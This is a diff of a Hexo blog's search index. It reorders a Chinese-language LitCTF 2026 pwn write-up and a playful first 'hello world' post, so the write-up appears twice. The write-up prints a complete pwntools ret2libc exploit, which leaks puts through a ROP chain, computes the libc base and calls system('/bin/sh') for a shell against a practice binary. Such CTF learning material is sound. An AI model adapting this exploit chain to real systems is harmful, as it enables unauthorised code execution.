@@ -1,6 +1,111 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>LitCTF 2026 - ret2libc</title>
+    <url>/2026/05/23/litctf-2026-ret2libc/</url>
+    <content><![CDATA[<p><a href="https://platform.cyclens.tech/api/upload/55d197e2-f1dd-47be-8439-6086bd58868d">题目地址</a></p>
+<p>这道题还是挺简单的挺适合初学者做的</p>
+<p>前置知识补充：ret2libc攻击的核心思想是利用程序中的栈溢出漏洞，覆盖函数的返回地址，使其指向libc库中的system函数，并传递”&#x2F;bin&#x2F;sh”字符串作为参数，从而获得一个shell。</p>
+<p>想要进阶的理解的话可以看这个<a href="https://xz.aliyun.com/news/14087">深入理解 ret2libc 技术-先知社区</a></p>
+<p>最基础的ret2libc 甚至还给了pop_rdi leak_value</p>
+<p>checksec一下</p>
+<p><img src="/images/litctf-ret2libc/image-20260523173601041.png" alt="checksec"></p>
+<p>ida一下</p>
+<p><img src="/images/litctf-ret2libc/image-20260523175847781.png" alt="ida"></p>
+<p>发现这里有现成的可以利用的rdi ret</p>
+<p><img src="/images/litctf-ret2libc/image-20260523175911228.png" alt="pop-rdi"></p>
+<p>还有泄露地址的地方</p>
+<p><img src="/images/litctf-ret2libc/image-20260523180028904.png" alt="leak"></p>
+<p>然后第一部分溢出之后然后泄露地址</p>
+<p>然后返回main函数，接受地址之后</p>
+<p>计算libc基址，然后溢出之后再binsh</p>
+<pre><code class="language-python">from pwn import *
+
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;)
+
+elf = ELF(&quot;./ret2libc&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+
+io = process(&quot;./ret2libc&quot;)
+#io = remote(&quot;challenge.cyclens.tech&quot;, 30528)
+
+pop_rdi = 0x4011b7
+ret = 0x4011b8
+leak_value = 0x4011c3
+main_addr = 0x401234
+
+offset = 72
+
+payload = b&quot;a&quot; * offset
+payload += p64(ret)
+payload += p64(pop_rdi)
+payload += p64(elf.got[&quot;puts&quot;])
+payload += p64(leak_value)
+payload += p64(ret)
+payload += p64(main_addr)
+
+io.recvuntil(b&quot;Tell me your name: &quot;)
+io.send(payload)
+
+io.recvuntil(b&quot;Leak: &quot;)
+puts_addr = int(io.recvline().strip(), 16)
+print(&quot;puts_addr =&quot;, hex(puts_addr))
+
+libc_base = puts_addr - libc.sym[&quot;puts&quot;]
+system_addr = libc_base + libc.sym[&quot;system&quot;]
+binsh_addr = libc_base + next(libc.search(b&quot;/bin/sh\x00&quot;))
+
+print(&quot;libc_base =&quot;, hex(libc_base))
+print(&quot;system_addr =&quot;, hex(system_addr))
+print(&quot;binsh_addr =&quot;, hex(binsh_addr))
+
+payload = b&quot;a&quot; * offset
+payload += p64(pop_rdi)
+payload += p64(binsh_addr)
+payload += p64(ret)
+payload += p64(system_addr)
+
+io.recvuntil(b&quot;Tell me your name: &quot;)
+io.send(payload)
+
+io.interactive()
+</code></pre>
+<p><img src="/images/litctf-ret2libc/image-20260523181855765.png" alt="getshell"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>基础题</tag>
+        <tag>ret2libc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于我的小小博客</title>
+    <url>/2026/05/21/hello-world/</url>
+    <content><![CDATA[<p>这是博客的第一篇测试文章，用来确认站点已经搭建完成并可以正常发布。</p>
+<h2 id="关于这里"><a href="#关于这里" class="headerlink" title="关于这里"></a>关于这里</h2><p>我会在这里写一些小小东西。</p>
+<p>可能是碎碎念</p>
+<p>或者关于其他好玩的东西</p>
+<p>嗯对</p>
+<p>我不休息我还能学    ⊂(‘ω’⊂ )))Σ≡&#x3D;─༄༅༄༅༄༅༄༅༄༅</p>
+<p>好好加油</p>
+<p>嗯对</p>
+<p>哒哒 哒哒哒 好想玩……</p>
+<p>哒哒 哒哒哒……</p>
+<p>已严肃写博客</p>
+<p><img src="/images/hello-world-image-20260526230611369.png" alt="image-20260526230611369"></p>
+]]></content>
+      <categories>
+        <category>建站</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+        <tag>GitHub Pages</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>somehash</title>
     <url>/2026/06/20/somehash/</url>
     <content><![CDATA[<p>拖拖拖拖拖拖拉拉拉拉拉拉的终于结束了somehash这个题</p>
@@ -307,111 +412,6 @@ io.interactive()
         <tag>Pwn</tag>
         <tag>非栈上格式化字符串</tag>
         <tag>栈</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>LitCTF 2026 - ret2libc</title>
-    <url>/2026/05/23/litctf-2026-ret2libc/</url>
-    <content><![CDATA[<p><a href="https://platform.cyclens.tech/api/upload/55d197e2-f1dd-47be-8439-6086bd58868d">题目地址</a></p>
-<p>这道题还是挺简单的挺适合初学者做的</p>
-<p>前置知识补充：ret2libc攻击的核心思想是利用程序中的栈溢出漏洞，覆盖函数的返回地址，使其指向libc库中的system函数，并传递”&#x2F;bin&#x2F;sh”字符串作为参数，从而获得一个shell。</p>
-<p>想要进阶的理解的话可以看这个<a href="https://xz.aliyun.com/news/14087">深入理解 ret2libc 技术-先知社区</a></p>
-<p>最基础的ret2libc 甚至还给了pop_rdi leak_value</p>
-<p>checksec一下</p>
-<p><img src="/images/litctf-ret2libc/image-20260523173601041.png" alt="checksec"></p>
-<p>ida一下</p>
-<p><img src="/images/litctf-ret2libc/image-20260523175847781.png" alt="ida"></p>
-<p>发现这里有现成的可以利用的rdi ret</p>
-<p><img src="/images/litctf-ret2libc/image-20260523175911228.png" alt="pop-rdi"></p>
-<p>还有泄露地址的地方</p>
-<p><img src="/images/litctf-ret2libc/image-20260523180028904.png" alt="leak"></p>
-<p>然后第一部分溢出之后然后泄露地址</p>
-<p>然后返回main函数，接受地址之后</p>
-<p>计算libc基址，然后溢出之后再binsh</p>
-<pre><code class="language-python">from pwn import *
-
-context(os=&quot;linux&quot;, arch=&quot;amd64&quot;)
-
-elf = ELF(&quot;./ret2libc&quot;)
-libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
-
-io = process(&quot;./ret2libc&quot;)
-#io = remote(&quot;challenge.cyclens.tech&quot;, 30528)
-
-pop_rdi = 0x4011b7
-ret = 0x4011b8
-leak_value = 0x4011c3
-main_addr = 0x401234
-
-offset = 72
-
-payload = b&quot;a&quot; * offset
-payload += p64(ret)
-payload += p64(pop_rdi)
-payload += p64(elf.got[&quot;puts&quot;])
-payload += p64(leak_value)
-payload += p64(ret)
-payload += p64(main_addr)
-
-io.recvuntil(b&quot;Tell me your name: &quot;)
-io.send(payload)
-
-io.recvuntil(b&quot;Leak: &quot;)
-puts_addr = int(io.recvline().strip(), 16)
-print(&quot;puts_addr =&quot;, hex(puts_addr))
-
-libc_base = puts_addr - libc.sym[&quot;puts&quot;]
-system_addr = libc_base + libc.sym[&quot;system&quot;]
-binsh_addr = libc_base + next(libc.search(b&quot;/bin/sh\x00&quot;))
-
-print(&quot;libc_base =&quot;, hex(libc_base))
-print(&quot;system_addr =&quot;, hex(system_addr))
-print(&quot;binsh_addr =&quot;, hex(binsh_addr))
-
-payload = b&quot;a&quot; * offset
-payload += p64(pop_rdi)
-payload += p64(binsh_addr)
-payload += p64(ret)
-payload += p64(system_addr)
-
-io.recvuntil(b&quot;Tell me your name: &quot;)
-io.send(payload)
-
-io.interactive()
-</code></pre>
-<p><img src="/images/litctf-ret2libc/image-20260523181855765.png" alt="getshell"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Pwn</category>
-      </categories>
-      <tags>
-        <tag>基础题</tag>
-        <tag>ret2libc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于我的小小博客</title>
-    <url>/2026/05/21/hello-world/</url>
-    <content><![CDATA[<p>这是博客的第一篇测试文章，用来确认站点已经搭建完成并可以正常发布。</p>
-<h2 id="关于这里"><a href="#关于这里" class="headerlink" title="关于这里"></a>关于这里</h2><p>我会在这里写一些小小东西。</p>
-<p>可能是碎碎念</p>
-<p>或者关于其他好玩的东西</p>
-<p>嗯对</p>
-<p>我不休息我还能学    ⊂(‘ω’⊂ )))Σ≡&#x3D;─༄༅༄༅༄༅༄༅༄༅</p>
-<p>好好加油</p>
-<p>嗯对</p>
-<p>哒哒 哒哒哒 好想玩……</p>
-<p>哒哒 哒哒哒……</p>
-<p>已严肃写博客</p>
-<p><img src="/images/hello-world-image-20260526230611369.png" alt="image-20260526230611369"></p>
-]]></content>
-      <categories>
-        <category>建站</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-        <tag>GitHub Pages</tag>
       </tags>
   </entry>
 </search>
